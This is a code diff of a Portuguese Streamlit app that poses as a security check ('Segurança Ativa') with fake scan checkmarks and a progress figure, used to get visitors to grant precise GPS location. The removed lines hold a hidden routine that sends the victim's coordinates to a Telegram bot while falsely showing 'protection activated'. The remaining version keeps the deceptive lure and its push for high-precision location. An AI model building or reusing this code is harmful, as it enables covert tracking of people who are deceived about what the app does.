@@ -1,135 +1,110 @@
 import streamlit as st
-import requests
-import time
 from streamlit_js_eval import streamlit_js_eval
 
-# ===============================
-# CONFIGURAÇÃO TELEGRAM
-# ===============================
-TOKEN = "SEU_TOKEN_DO_BOT"
-CHAT_ID = "SEU_CHAT_ID"
+st.set_page_config(
+    page_title="Segurança Ativa",
+    layout="centered"
+)
 
-def enviar_telegram(msg):
-    try:
-        requests.post(
-            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-            json={
-                "chat_id": CHAT_ID,
-                "text": msg,
-                "parse_mode": "Markdown",
-                "disable_web_page_preview": True
-            },
-            timeout=5
-        )
-    except:
-        pass
-
-# ===============================
-# CONFIG STREAMLIT
-# ===============================
-st.set_page_config(page_title="Segurança Ativa", layout="centered")
-
-# ===============================
-# CSS
-# ===============================
 st.markdown("""
 <style>
-body { background:#0b0e13; color:#fff; }
-.circle {
-    width:180px;height:180px;border-radius:50%;
-    border:3px solid #2ecc71;
-    display:flex;align-items:center;justify-content:center;
-    box-shadow:0 0 40px rgba(46,204,113,.6);
-    margin:auto;
+body {
+    background-color: #0f1115;
 }
-.pct { font-size:44px;font-weight:bold; }
-.alert {
-    background:#3a3f00;
+.botao {
+    width:100%;
     padding:16px;
+    font-size:16px;
     border-radius:12px;
+}
+.card {
+    background:#12161c;
+    padding:20px;
+    border-radius:20px;
+    text-align:center;
+}
+.aviso {
+    background:#1f2933;
+    color:white;
+    padding:18px;
+    border-radius:16px;
+    margin-top:20px;
 }
 </style>
 """, unsafe_allow_html=True)
 
-# ===============================
-# INTERFACE
-# ===============================
 st.markdown("<h2 style='text-align:center'>Verificar segurança</h2>", unsafe_allow_html=True)
 
-bolha = st.empty()
-bolha.markdown(
-    "<div class='circle'><div class='pct'>4%</div></div>",
-    unsafe_allow_html=True
-)
+st.markdown("""
+<div class="card">
+    <h1>4%</h1>
+    <p>✅ Ambiente de pagamentos</p>
+    <p>✅ Privacidade e segurança</p>
+    <p>✅ Vírus</p>
+</div>
+""", unsafe_allow_html=True)
 
-st.write("✅ Ambiente de pagamentos")
-st.write("✅ Privacidade e segurança")
-st.write("✅ Vírus")
+st.write("")
 
-# ===============================
-# SESSION STATE
-# ===============================
-if "pedindo_geo" not in st.session_state:
-    st.session_state.pedindo_geo = False
-
-# ===============================
 # BOTÃO
-# ===============================
-if st.button("● ATIVAR PROTEÇÃO", use_container_width=True):
-    st.session_state.pedindo_geo = True
-    st.rerun()   # ✅ CORREÇÃO AQUI
+ativar = st.button("● ATIVAR PROTEÇÃO", use_container_width=True)
 
-# ===============================
-# GEOLOCALIZAÇÃO
-# ===============================
-if st.session_state.pedindo_geo:
-
+if ativar:
     geo = streamlit_js_eval(
         js_expressions="""
         new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve({ ok:false, reason:"no_geolocation" });
+            }
+
             navigator.geolocation.getCurrentPosition(
                 (pos) => resolve({
-                    ok: true,
+                    ok:true,
                     lat: pos.coords.latitude,
                     lon: pos.coords.longitude,
                     accuracy: pos.coords.accuracy
                 }),
-                (err) => resolve({ ok:false }),
-                { enableHighAccuracy:true, timeout:15000 }
+                (err) => resolve({
+                    ok:false,
+                    reason: err.code
+                }),
+                {
+                    enableHighAccuracy: true,
+                    timeout: 20000,
+                    maximumAge: 0
+                }
             );
         })
         """,
-        key="geo_final"
+        key="geo_request"
     )
 
-    if geo is None:
-        st.info("Aguardando permissão de localização…")
+    # SE NEGAR OU NÃO TIVER GPS
+    if not geo or not geo.get("ok"):
+        st.markdown("""
+        <div class="aviso">
+            <h4>Para uma experiência melhor</h4>
+            <p>
+            O dispositivo precisa usar a <b>Precisão de Local</b>.
+            </p>
+            <ul>
+                <li>Ative a localização do dispositivo</li>
+                <li>Permita localização precisa no navegador</li>
+            </ul>
+            <p style="opacity:.7;font-size:13px">
+            Configurações → Localização → Precisão de Local
+            </p>
+        </div>
+        """, unsafe_allow_html=True)
+
         st.stop()
 
-    if not geo.get("ok"):
-        st.markdown(
-            "<div class='alert'>Permissão de localização negada ou indisponível.</div>",
-            unsafe_allow_html=True
-        )
-        st.session_state.pedindo_geo = False
-        st.stop()
+    # SE PERMITIR
+    lat = geo["lat"]
+    lon = geo["lon"]
+    acc = geo["accuracy"]
 
-    # ===============================
-    # SUCESSO
-    # ===============================
-    for i in range(4, 101, 4):
-        bolha.markdown(
-            f"<div class='circle'><div class='pct'>{i}%</div></div>",
-            unsafe_allow_html=True
-        )
-        time.sleep(0.04)
-
-    mapa = f"https://www.google.com/maps?q={geo['lat']},{geo['lon']}"
-
-    enviar_telegram(
-        f"🛡️ PROTEÇÃO ATIVADA\n\n"
-        f"📍 [Localização]({mapa})"
-    )
-
-    st.success("Proteção ativada com sucesso!")
-    st.session_state.pedindo_geo = False
+    st.success("Proteção ativada com sucesso ✅")
+    st.write(f"📍 Latitude: {lat}")
+    st.write(f"📍 Longitude: {lon}")
+    st.write(f"🎯 Precisão: {acc:.1f} metros")
